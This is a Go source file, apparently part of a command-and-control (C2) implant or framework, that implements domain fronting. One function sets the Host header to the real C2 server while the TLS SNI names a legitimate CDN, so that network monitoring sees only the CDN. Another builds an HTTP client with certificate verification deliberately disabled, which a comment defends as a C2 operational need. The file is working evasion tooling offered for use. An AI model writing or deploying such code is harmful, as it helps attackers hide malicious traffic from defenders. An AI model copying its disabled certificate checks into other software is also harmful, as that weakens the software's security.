package c2

import (
	"crypto/tls"
	"net/http"
	"time"
)

// ApplyFronting configures an HTTP request for domain fronting.
// The TLS SNI is set to frontDomain (a legitimate CDN), while the
// Host header is set to actualHost (the real C2 server hostname).
// This causes the CDN to route the request to the C2 backend while
// network observers see only the legitimate CDN domain.
func ApplyFronting(req *http.Request, frontDomain string, actualHost string) {
	// The Host header controls routing at the CDN/reverse proxy layer.
	req.Host = actualHost
	// The URL host is what appears in TLS SNI via the Go HTTP client.
	// We manipulate it so the TLS connection targets the front domain.
	if req.URL != nil {
		req.URL.Host = frontDomain
	}
}

// NewFrontedClient creates an HTTP client configured for domain fronting.
// The TLS SNI is locked to frontDomain regardless of the request target,
// ensuring all connections appear to go to the legitimate CDN.
//
// NOTE: TLS certificate verification is intentionally disabled (InsecureSkipVerify=true).
// Domain fronting requires connecting to a CDN IP while presenting the C2 hostname in
// the Host header; the CDN's certificate will not match the actual C2 domain, so
// standard certificate validation would always fail. This is a deliberate trade-off
// for C2 operational requirements — do not enable verification without a full
// rearchitect of the fronting trust model.
func NewFrontedClient(frontDomain string, timeout time.Duration) *http.Client {
	tlsCfg := &tls.Config{
		ServerName:         frontDomain,
		InsecureSkipVerify: true, //nolint:gosec // C2 fronting requires flexible cert validation
		MinVersion:         tls.VersionTLS12,
	}

	transport := &http.Transport{
		TLSClientConfig:   tlsCfg,
		Proxy:             http.ProxyFromEnvironment,
		DisableKeepAlives: true,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   timeout,
	}
}
